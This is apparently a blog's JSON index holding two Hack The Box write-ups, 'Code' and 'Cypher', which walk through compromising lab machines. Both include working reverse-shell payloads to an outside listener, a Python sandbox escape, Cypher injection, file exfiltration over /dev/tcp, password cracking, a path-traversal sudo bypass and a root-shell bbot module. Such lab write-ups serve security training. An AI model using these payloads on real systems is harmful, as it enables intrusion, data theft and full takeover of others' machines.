[
  
  {
    "title": "HTB Code",
    "url": "/posts/HTB_code/",
    "categories": "HTB",
    "tags": "Linux, HTB, Python, Jail Break, Sandbox Bypss, exfiltration, path traversal",
    "date": "2025-08-03 00:00:00 +0000",
    "content": "   OS: üêß Linux Difficulty: Easy Points: 20 Author: FisMatHack   Code starts by exploiting an RCE in a Python Code Editor web app by using a Python Jail Bypass. Once we have the foothold and after files inspection, we find a databas file with users creds, that we crack to move laterally. For the privesc, the user has permissions to a backup utility script, to be exploited via a path traversal vulnerabiliy, to backup root directory, consequently, we get root.    Foothold We start by a scan for open ports using Nmap: Nmap scan report for 10.10.11.62 Host is up (0.050s latency). Not shown: 998 closed tcp ports (reset) PORT     STATE SERVICE VERSION 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA) |   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA) |_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519) 5000/tcp open  http    Gunicorn 20.0.4 |_http-title: Python Code Editor |_http-server-header: gunicorn/20.0.4 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Beside the ssh running on port 22, we have a web app running on port 5000, so visit this web page :   Website Homepage  So it‚Äôs basically an online python code editor, we write a python script, and execute it by clicking on ‚ÄúRun‚Äù, as described in /about :  Website About page  As there are two other pages, one for registering a new user account, the other to login with an already registered user account :                                               Register page       Login page           This mainly for saving the user‚Äôs scripts.  Website Save page  We use Burpsuite to intercept a code running request, then we just change the code each time, for better output (just make sure the indentation is respected, even though code may look like one block when URL encoded).  So we craft a payload to bypass this Python sandbox.  So we start by printing globals() output. print(globals())  The globals() function in Python returns a dictionary representing the current global symbol table, showing all the names (variables, functions, classes, modules, ‚Ä¶) that are accessible in the current global scope.   globals  we notice that the module os is imported :   os module found  We list all classes that inherit from object for cls in [].__class__.__base__.__subclasses__():     print(cls, end = \"  \")    Among these classes, we find the BuiltinImporter class :   BuiltinImporter class  Basically, BuiltinImporter is responsible for finding and loading built-in modules.     Note: Import Steps for os module :        Checks BuiltinImporter (not found)     Checks sys.path via PathFinder     Finds os.py in standard library     During execution, os.py imports from built-in posix module      We‚Äôll simply bypass the constraint by obfuscating the restricted keywords, by dynamically constructing them, by  concatenating the character translation of their numerical ASCII code :  for cls in [].__class__.__base__.__subclasses__():   if cls.__name__ == ''.join([chr(x) for x in [66, 117, 105, 108, 116, 105, 110, 73, 109, 112, 111, 114, 116, 101, 114]]):   mod = cls().load_module(''.join(chr(x) for x in [111, 115]))     getattr(mod, ''.join(chr(x) for x in [115, 121, 115, 116, 101, 109]))('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yMi80NDQ0IDA+JjE= | base64 -d | bash')  So we‚Äôll load the os module, and then we use getattr() to access system method, to execute arbitrary commands.  getattr() is a built-in Python function that dynamically accesses an object‚Äôs attributes or methods by name (as a string).  So our exploit, is interpreted as : for cls in [].__class__.__base__.__subclasses__():   if cls.__name__ == 'BuiltinImporter':   mod = cls().load_module('os')     getattr(mod, 'system')('echo &lt;payload&gt; | base64 -d | bash')  For the payload, we can just use a regular reverse shell payload : bash -i &gt;&amp; /dev/tcp/&lt;ip_address&gt;/&lt;port&gt; 0&gt;&amp;1   We start a listener on port 4444, and we run our exploit :   Exploit request We receive a shell session as app-production!  ‚ûú  Code rlwrap nc -lvnp 4444 Listening on 0.0.0.0 4444 Connection received on 10.10.11.62 60540 bash: cannot set terminal process group (100765): Inappropriate ioctl for device bash: no job control in this shell app-production@code:~/app$ whoami whoami app-production  We visit it‚Äôs home directory, and we find the user flag there :  app-production@code:~$ cat user.txt cat user.txt 6c9bc18baa9019db68f57821xxxxxxxx   Lateral movement We list the content of the app directory, we find a directory called instance, containing an  sqlite3 database file :  app-production@code:~/app$ find . -type f find . -type f ./app.py ./static/css/styles.css ./templates/index.html ./templates/codes.html ./templates/register.html ./templates/login.html ./templates/about.html ./__pycache__/app.cpython-38.pyc ./instance/database.db app-production@code:~/app$  We download this file to our machine, by : 1) Starting a listener on port 1337 and redirects the incoming data to a file on our machine : nc -l -p 1337 &gt; database.db   1) Sending the contents of file directly to the listening netcat server over TCP from the box : cat database.db &gt; /dev/tcp/10.10.16.22/1337   We open this database file using sqlitebrowser :  Database tables list We read the contain of the table user :   User table  We have two credentials! The password is most likely an MD5 hash, as it‚Äôs represented as a 32-character hexadecimal string, equals to 128 bits.  We try to crack the hashes using CrackStation Online Hash Cracker :  1) First hash cracked, plaintext password of development is : development  First hash Cracked  2) Second hash cracked, plaintext password of martin is : nafeelswordmaster  Second hash Cracked  So we try both credentials with ssh : 1) Failed login to development : ‚ûú  Code ssh development@10.10.11.62 development@10.10.11.62's password: Permission denied, please try again.  2) Successful login to martin : ‚ûú  Code ssh martin@10.10.11.62 martin@10.10.11.62's password: Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)   * Documentation:  https://help.ubuntu.com  * Management:     https://landscape.canonical.com  * Support:        https://ubuntu.com/pro   System information as of Tue 05 Aug 2025 12:14:15 AM UTC    System load:           0.06   Usage of /:            52.5% of 5.33GB   Memory usage:          14%   Swap usage:            0%   Processes:             235   Users logged in:       2   IPv4 address for eth0: 10.10.11.62   IPv6 address for eth0: dead:beef::250:56ff:fe94:4acd   Expanded Security Maintenance for Applications is not enabled.  0 updates can be applied immediately.  Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status   The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings    The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.  Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law.  Last login: Tue Aug 5 00:14:18 2025 from 10.10.16.22 martin@code:~$ whoami martin   So we succesfully logged in as martin! Now time for the privesc.  Privilege escalation As we have martin‚Äôs password, first thing to check is to list the allowed sudo commands for the current user :  martin@code:~$ sudo -l Matching Defaults entries for martin on localhost:     env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User martin may run the following commands on localhost:     (ALL : ALL) NOPASSWD: /usr/bin/backy.sh   So we can run /usr/bin/backy.sh as root, so a potential privesc attack vector.  We read the content of /usr/bin/backy.sh : martin@code:~$ cat /usr/bin/backy.sh #!/bin/bash  if [[ $# -ne 1 ]]; then     /usr/bin/echo \"Usage: $0 &lt;task.json&gt;\"     exit 1 fi  json_file=\"$1\"  if [[ ! -f \"$json_file\" ]]; then     /usr/bin/echo \"Error: File '$json_file' not found.\"     exit 1 fi  allowed_paths=(\"/var/\" \"/home/\")  updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub(\"\\\\.\\\\./\"; \"\"))' \"$json_file\")  /usr/bin/echo \"$updated_json\" &gt; \"$json_file\"  directories_to_archive=$(/usr/bin/echo \"$updated_json\" | /usr/bin/jq -r '.directories_to_archive[]')  is_allowed_path() {     local path=\"$1\"     for allowed_path in \"${allowed_paths[@]}\"; do         if [[ \"$path\" == $allowed_path* ]]; then             return 0         fi     done     return 1 }  for dir in $directories_to_archive; do     if ! is_allowed_path \"$dir\"; then         /usr/bin/echo \"Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed.\"         exit 1     fi done  /usr/bin/backy \"$json_file\"   The script basically is for backing up directories, with the exception of subdirectories of /home and /var, any other root directory would be refused, and we find a regex, that finds and replace every ../ by ‚Äú ‚Äú (nothing), simply deleting it, in order to prevent path traversal.  So the scripts requires a json task file that contains the path to the directory to be backed up. martin@code:~/backups$ sudo /usr/bin/backy.sh Usage: /usr/bin/backy.sh &lt;task.json&gt;  Here is an example of a task file found in the backup folder in the home directory : {         \"destination\": \"/home/martin/backups/\",         \"multiprocessing\": true,         \"verbose_log\": false,         \"directories_to_archive\": [                 \"/home/app-production/app\"         ],          \"exclude\": [                 \".*\"         ] }  So all we have to do, is to modify this task file, to backup the /root directory.  In order to achieve this, we change the directories_to_archive, in a way to respect the constraint of the path beginning with /home or /var, and then bypass the path traversal sanitization filter.  Knowing that ../ is getting deleted, we replace them by ....//, so that after the deletion of the the first ../, we still left with a ../, so we can change directory to root.  Our final task file will look like : {         \"destination\": \"/home/martin/backups/\",         \"multiprocessing\": true,         \"verbose_log\": true,         \"directories_to_archive\": [                 \"/var/....//root\"         ] }  We remove the exclusion line so that we backup hidden files and directories (like .ssh, which is the way for the root shell)  We set the verbose_log to true in order for backup messages output.  Now time to run it again : martin@code:~/backups$ sudo /usr/bin/backy.sh task.json 2025/08/06 17:39:16 üçÄ backy 1.2 2025/08/06 17:39:16 üìã Working with task.json ... 2025/08/06 17:39:16 üí§ Nothing to sync 2025/08/06 17:39:16 üì§ Archiving: [/var/../root] 2025/08/06 17:39:16 üì• To: /home/martin/backups ... 2025/08/06 17:39:16 üì¶ tar: Removing leading `/var/../' from member names /var/../root/ /var/../root/.local/ /var/../root/.local/share/ /var/../root/.local/share/nano/ /var/../root/.local/share/nano/search_history /var/../root/.selected_editor /var/../root/.sqlite_history /var/../root/.profile /var/../root/scripts/ /var/../root/scripts/cleanup.sh /var/../root/scripts/backups/ /var/../root/scripts/backups/task.json /var/../root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2 /var/../root/scripts/database.db /var/../root/scripts/cleanup2.sh /var/../root/.python_history /var/../root/root.txt /var/../root/.cache/ /var/../root/.cache/motd.legal-displayed /var/../root/.ssh/ /var/../root/.ssh/id_rsa /var/../root/.ssh/authorized_keys /var/../root/.bash_history /var/../root/.bashrc  It works out! Now we have the backup of the root directory successfully! All is left is to exfiltrate it, unzip it, and login in as root.  Same technique as previously, we start a listener on our machine, and we send the file over TCP to our machine, upon unzip it, we can directly read the root flag root.txt, but we want persistence :)  So we run ssh using the private key of root : ‚ûú  .ssh ssh -i id_rsa root@10.10.11.62 Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)   * Documentation:  https://help.ubuntu.com  * Management:     https://landscape.canonical.com  * Support:        https://ubuntu.com/pro   System information as of Wed 06 Aug 2025 06:06:23 PM UTC    System load:           0.0   Usage of /:            53.7% of 5.33GB   Memory usage:          19%   Swap usage:            0%   Processes:             236   Users logged in:       1   IPv4 address for eth0: 10.10.11.62   IPv6 address for eth0: dead:beef::250:56ff:fe94:9e73   Expanded Security Maintenance for Applications is not enabled.  0 updates can be applied immediately.  Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status   The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings   Last login: Wed Aug 6 18:06:25 2025 from 10.10.16.22 root@code:~#  And we got root shell! Now we can read our root flag  : root@code:~# cat root.txt 468aab655932260d0cff4dexxxxxxxx   "
  },
  
  {
    "title": "HTB Cypher",
    "url": "/posts/HTB_cypher/",
    "categories": "HTB",
    "tags": "Linux, HTB, Neo4j, cypher injection, bbot",
    "date": "2025-07-31 00:00:00 +0000",
    "content": "   OS: üêß Linux Difficulty: Medium Points: 40 Author: Techromancer   Cypher is focused on a cypher injection flaw granting a shell as neo4j. A history file leaks credentials for graphasm, who can run bbot as root. Privilege escalation is achieved by abusing a custom bbot module to execute arbitrary commands.    Foothold  We start by a scan for open ports using Nmap: Nmap scan report for 10.10.11.57 Host is up (0.12s latency). Not shown: 998 closed tcp ports (reset) PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA) |_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519) 80/tcp open  http    nginx 1.24.0 (Ubuntu) |_http-title: Did not follow redirect to http://cypher.htb/ |_http-server-header: nginx/1.24.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   We notice the ssh and http ports open. We add the domain cypher.htb DNS entry to the file /etc/hosts.  # as root echo '10.10.11.61 cypher.htb' &gt;&gt; /etc/hosts   We visit the webpage at http://cypher.htb, we get:   Website Homepage  We fuzz the website for more directories in parallel : ‚ûú  Cypher ffuf -u http://cypher.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt          /'___\\  /'___\\           /'___\\        /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/        \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\         \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\_/          \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\           \\/_/    \\/_/   \\/___/    \\/_/         v2.1.0-dev ________________________________________________   :: Method           : GET  :: URL              : http://cypher.htb/FUZZ  :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt  :: Follow redirects : false  :: Calibration      : false  :: Timeout          : 10  :: Threads          : 40  :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________  login                   [Status: 200, Size: 3671, Words: 863, Lines: 127, Duration: 313ms] api                     [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 1651ms] about                   [Status: 200, Size: 4986, Words: 1117, Lines: 179, Duration: 209ms] demo                    [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 248ms] index                   [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 1832ms] testing                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 1409ms]  We get an interesting directory, testing, upon visiting it, we end up with a jar file, that we download and decompile it for further information gathering.   testing directory listing  We download the jd-gui decompiler for further analysis.  We open the jar file custom-apoc-extension-1.0-SNAPSHOT.jar :  JAR file structure  Among these files, CustomFunctions catches our intention, we check its content, we get some important info, a command injection vulnerability in the getUrlStatusCode method! as there is no sanitization of url param, that is directly passed into sh -c command.   Decompiled CustomFunctions.class  String[] command = { \"/bin/sh\", \"-c\", \"curl -s -o /dev/null --connect-timeout 1 -w %{http_code} \" + url }; System.out.println(\"Command: \" + Arrays.toString((Object[])command)); Process process = Runtime.getRuntime().exec(command);  Back to our main page, Upon clicking on ‚ÄòTry our free demo‚Äô, we get redirected to a login page :  Website Loginpage  As we don‚Äôt have any credentials, we try (‚Äò) as a username, and we get an error revealing that Neo4j database is used in the backend.   Login error message  Upon inspecting the request and response using Burpsuite:                                               HTTP request       HTTP response           Now we have the query used for the login, which is :  MATCH (u:USER) -[:SECRET]-&gt; (h:SHA1) WHERE u.name = '' return h.value as hash  So we craft a cypher injection in order to exploit this flaw, and by combining with the present command injection vulnerability in that java procedure, we turn it into an RCE.  first, we start the payload by ‚Äò OR 1=1, to bypass any condition that was supposed to restrict access. WHERE u.name = '' OR 1=1 ...  Hence we can move on to calling getUrlStatusCode procedure, by cypher method CALL, as follow :  CALL custom.getUrlStatusCode(\\\"x; echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIyLzQ0NDQgMD4mMQo=|base64 -d | bash\\\")  So we write some string in the url parameters followed  by a ; to end the command, then we inject our reverse shell, so it‚Äôs basically in base64, to be decoded and piped to bash to be executed.  (The reverse shell used for this) ‚ûú  Cypher echo '/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.22/4444 0&gt;&amp;1'| base64 -w0 L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIyLzQ0NDQgMD4mMQo=   As the main cypher query expects a hash to be returned, we append to our malicious call : YIELD statusCode RETURN statusCode AS hash //  YIELD extract the statusCode which is returned by getUrlStatusCode procedure call, and returned as hash(which is waited by the main query, otherwise it returns a syntax error), and the // at the end, cuts off the rest of the original query so the injection ends cleanly, hence, we avoid syntax errors.  So the final payload looks like : ' OR 1=1 CALL custom.getUrlStatusCode(\\\"x; echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIyLzQ0NDQgMD4mMQo=|base64 -d | bash\\\") YIELD statusCode RETURN statusCode AS hash //   Time to inject this payload! We start our listener, on port 4444 : ‚ûú  Cypher rlwrap nc -lvnp 4444 Listening on 0.0.0.0 4444  And we send the request with the crafted payload :  Malicious request  And we get our reverse shell as neo4j! ‚ûú  Cypher rlwrap nc -lvnp 4444 Listening on 0.0.0.0 4444 Connection received on 10.10.11.57 47566 bash: cannot set terminal process group (1437): Inappropriate ioctl for device bash: no job control in this shell neo4j@cypher:/$  We list the users that might have shell access, also identify real login users (especially human users), since system/service accounts often use /usr/sbin/nologin or /bin/false. neo4j@cypher:/$ cat /etc/passwd | grep 'bash' cat /etc/passwd | grep 'bash' root:x:0:0:root:/root:/bin/bash graphasm:x:1000:1000:graphasm:/home/graphasm:/bin/bash neo4j:x:110:111:neo4j,,,:/var/lib/neo4j:/bin/bash  So we have graphsm as another user, which is can be the real user we‚Äôre searching for, we‚Äôll just dig in for more information that leads us to something.  Upon moving the home directory of the user neo4j, and listing all its content, we get : neo4j@cypher:~$ ls -la ls -la total 60 drwxr-xr-x 13 neo4j adm   4096 Aug  1 13:10 . drwxr-xr-x 50 root  root  4096 Feb 17 16:48 .. -rw-r--r--  1 neo4j neo4j   63 Oct  8  2024 .bash_history drwxrwxr-x  4 neo4j neo4j 4096 Aug  1 13:10 .bbot drwxrwxr-x  3 neo4j adm   4096 Oct  8  2024 .cache drwxr-xr-x  2 neo4j adm   4096 Aug 16  2024 certificates drwxrwxr-x  3 neo4j neo4j 4096 Aug  1 13:10 .config drwxr-xr-x  6 neo4j adm   4096 Oct  8  2024 data drwxr-xr-x  2 neo4j adm   4096 Aug 16  2024 import drwxr-xr-x  2 neo4j adm   4096 Feb 17 16:24 labs drwxr-xr-x  2 neo4j adm   4096 Aug 16  2024 licenses -rw-r--r--  1 neo4j adm     52 Oct  2  2024 packaging_info drwxr-xr-x  2 neo4j adm   4096 Feb 17 16:24 plugins drwxr-xr-x  2 neo4j adm   4096 Feb 17 16:24 products drwxr-xr-x  2 neo4j adm   4096 Aug  1 09:43 run lrwxrwxrwx  1 neo4j adm      9 Oct  8  2024 .viminfo -&gt; /dev/null  First thing to notice, is that usually, .bash_history is redirected to /dev/null, which means it‚Äôs always emptied, but in our case, there is still some history of runned commands, we read its content :  neo4j@cypher:~$ cat .bash_history cat .bash_history neo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK  We get a password! First intuitive thing to try, is to login as graphasm with this password, password reuse is something common, so we try changing to this user locally, by :  neo4j@cypher:~$ su - graphasm su - graphasm Password: cU4btyib.20xtCMCXkBmerhK   And it just hangs, which means it didn‚Äôt work, so we try with ssh :  ‚ûú  Cypher ssh graphasm@cypher.htb graphasm@cypher.htb's password: Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-53-generic x86_64)   * Documentation:  https://help.ubuntu.com  * Management:     https://landscape.canonical.com  * Support:        https://ubuntu.com/pro   System information as of Fri Aug  1 10:27:36 PM UTC 2025    System load:  0.08              Processes:             231   Usage of /:   69.5% of 8.50GB   Users logged in:       0   Memory usage: 27%               IPv4 address for eth0: 10.10.11.57   Swap usage:   0%   Expanded Security Maintenance for Applications is not enabled.  184 updates can be applied immediately. 118 of these updates are standard security updates. To see these additional updates run: apt list --upgradable  Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status   The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings   Last login: Fri Aug 1 22:27:37 2025 from 10.10.16.22 graphasm@cypher:~$  We‚Äôre in as graphasm! Now we can read the user flag by : graphasm@cypher:~$ cat user.txt f4a42dcd9e1749fc425da1f5xxxxxxxx   Privilege escalation As we have graphsm password, first thing to check is to list the allowed sudo commands for the current user : graphasm@cypher:~$ sudo -l Matching Defaults entries for graphasm on cypher:     env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty  User graphasm may run the following commands on cypher:     (ALL) NOPASSWD: /usr/local/bin/bbot  So we can run /usr/local/bin/bbot as root, so a potential privesc attack vector. We see what bbot is, so we run : graphasm@cypher:~$ bbot --help   ______  _____   ____ _______  |  ___ \\|  __ \\ / __ \\__   __|  | |___) | |__) | |  | | | |  |  ___ &lt;|  __ &lt;| |  | | | |  | |___) | |__) | |__| | | |  |______/|_____/ \\____/  |_|  BIGHUGE BLS OSINT TOOL v2.1.0.4939rc  www.blacklanternsecurity.com/bbot  usage: bbot [-h] [-t TARGET [TARGET ...]] [-w WHITELIST [WHITELIST ...]] [-b BLACKLIST [BLACKLIST ...]] [--strict-scope] [-p [PRESET ...]] [-c [CONFIG ...]] [-lp] [-m MODULE [MODULE ...]] [-l] [-lmo]             [-em MODULE [MODULE ...]] [-f FLAG [FLAG ...]] [-lf] [-rf FLAG [FLAG ...]] [-ef FLAG [FLAG ...]] [--allow-deadly] [-n SCAN_NAME] [-v] [-d] [-s] [--force] [-y] [--dry-run] [--current-preset]             [--current-preset-full] [-o DIR] [-om MODULE [MODULE ...]] [--json] [--brief] [--event-types EVENT_TYPES [EVENT_TYPES ...]]             [--no-deps | --force-deps | --retry-deps | --ignore-failed-deps | --install-all-deps] [--version] [-H CUSTOM_HEADERS [CUSTOM_HEADERS ...]] [--custom-yara-rules CUSTOM_YARA_RULES]  Bighuge BLS OSINT Tool  According to their Github repo : https://github.com/blacklanternsecurity/bbot ‚ÄúBEE¬∑bot is a multipurpose scanner inspired by Spiderfoot, built to automate your Recon, Bug Bounties, and ASM!‚Äù Used as a domain finder, web spider, email gatherer, web scanner, etc.  A simple Google dorking for privesc exploits for the current version of bbot(v2.1.0), we find that there is an existing exploit :  Privesc exploit google search  We enter the first link, we find the exploit, made by Huseyin Mardinli:  Privesc exploit steps  We visit the exploit repo (https://github.com/Housma/bbot-privesc), and we try to understand how does the exploit work :   Exploit content  So we have a python script, systeminfo_enum.py : from bbot.modules.base import BaseModule import pty import os  class systeminfo_enum(BaseModule):     watched_events = []     produced_events = []     flags = [\"safe\", \"passive\"]     meta = {\"description\": \"System Info Recon (actually spawns root shell)\"}      async def setup(self):         self.hugesuccess(\"üì° systeminfo_enum setup called ‚Äî launching shell!\")         try:             pty.spawn([\"/bin/bash\", \"-p\"])         except Exception as e:             self.error(f\"‚ùå Shell failed: {e}\")         return True  And a YAML file, preset.yml : description: System Info Recon Scan module_dirs:   - . modules:   - systeminfo_enum   systeminfo_enum is a custom BBOT module that is meant for system information enumeration, marked as safe and passive to make the module appear harmless, it spawns a privileged bash (root shell), upon BBOT starts the scan via setup(), which executes automatically.  We clone the repo locally as a zip, launch a local http server, and download the zip file into our box, in /tmp directory (it‚Äôs emptied regularly, so we don‚Äôt spoil other users of the machine :) )  HTTP server launch : ‚ûú  Cypher python -m http.server 80  Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  Exploit download : graphasm@cypher:/tmp$ curl http://10.10.16.22/bbot-privesc.zip -O bbot-privesc.zip    Once we have the exploit, we unzip and cd into the exploit directory, we run with sudo : sudo /usr/local/bin/bbot -t dummy.com -p preset.yml --event-types ROOT   Didn‚Äôt work out at first try : graphasm@cypher:/tmp/bbot-privesc$ sudo /usr/local/bin/bbot -t dummy.com -p preset.yml --event-types ROOT   ______  _____   ____ _______  |  ___ \\|  __ \\ / __ \\__   __|  | |___) | |__) | |  | | | |  |  ___ &lt;|  __ &lt;| |  | | | |  | |___) | |__) | |__| | | |  |______/|_____/ \\____/  |_|  BIGHUGE BLS OSINT TOOL v2.1.0.4939rc  www.blacklanternsecurity.com/bbot  [WARN] Error parsing preset \"preset.yml\": Could not find preset at \"preset.yml\" - file does not exist. Use -lp to list available presets   I needed to provide the full path to the preset.yml : graphasm@cypher:/tmp/bbot-privesc$ sudo /usr/local/bin/bbot -t dummy.com -p /tmp/bbot-privesc/preset.yml --event-types ROOT   ______  _____   ____ _______  |  ___ \\|  __ \\ / __ \\__   __|  | |___) | |__) | |  | | | |  |  ___ &lt;|  __ &lt;| |  | | | |  | |___) | |__) | |__| | | |  |______/|_____/ \\____/  |_|  BIGHUGE BLS OSINT TOOL v2.1.0.4939rc  www.blacklanternsecurity.com/bbot  [INFO] Scan with 1 modules seeded with 1 targets (1 in whitelist) [INFO] Loaded 1/1 scan modules (systeminfo_enum) [INFO] Loaded 5/5 internal modules (aggregate,cloudcheck,dnsresolve,excavate,speculate) [INFO] Loaded 5/5 output modules, (csv,json,python,stdout,txt) [SUCC] systeminfo_enum: üì° systeminfo_enum setup called ‚Äî launching shell!  root@cypher:/tmp/bbot-privesc#  Now we have a shell as root!  We read the root flag :  root@cypher:~# cat root.txt f79b5158d872d33946bba8dbxxxxxxxx  "
  }
  
]

